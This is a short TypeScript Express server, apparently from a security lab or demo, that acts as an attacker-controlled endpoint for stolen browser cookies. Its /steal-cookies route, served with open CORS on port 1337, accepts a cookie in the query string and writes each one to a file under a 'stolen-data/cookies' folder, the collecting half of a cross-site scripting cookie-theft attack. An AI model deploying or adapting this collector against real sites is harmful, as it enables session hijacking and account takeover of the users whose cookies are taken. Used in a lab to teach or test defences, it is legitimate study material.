import * as express from 'express'
import * as cors from 'cors'
import { mkdir, writeFile } from 'fs/promises'
import { createHash } from 'crypto'

const app = express()

app.use(cors())
app.use((_, res, next) => {
  res.contentType('text/plain')
  next()
})

app.get('/steal-cookies', async (req, res) => {
  const cookie = req.query.cookie
  if (cookie && typeof cookie === 'string' && cookie !== 'undefined') {
    const decodedCookie = decodeURIComponent(cookie)
    const filename = await saveStolenCookie(decodedCookie)
    console.log(`Saved stolen cookie to ${filename}`)
    return res.send(`Om Nom Nom Nom.\n`)
  } else {
    console.log(`No cookies to steal`)
    return res.status(400).send(`Me lost me cookie at the disco.\n`)
  }
})

const port = 1337
const hostname = process.env['HOSTNAME'] || '127.0.0.1'
app.listen(port, hostname, () =>
  console.log(
    `Attacker controlled services listening on http://${hostname}:${port}`
  )
)

async function saveStolenCookie(cookie: string): Promise<string> {
  const dir = 'attacker-controlled-services/stolen-data/cookies'
  await mkdir(dir, { recursive: true })
  const filename = `${dir}/${md5Hex(cookie)}.txt`
  await writeFile(filename, cookie)
  return filename
}

function md5Hex(input: string): string {
  return createHash('md5').update(input).digest('hex')
}
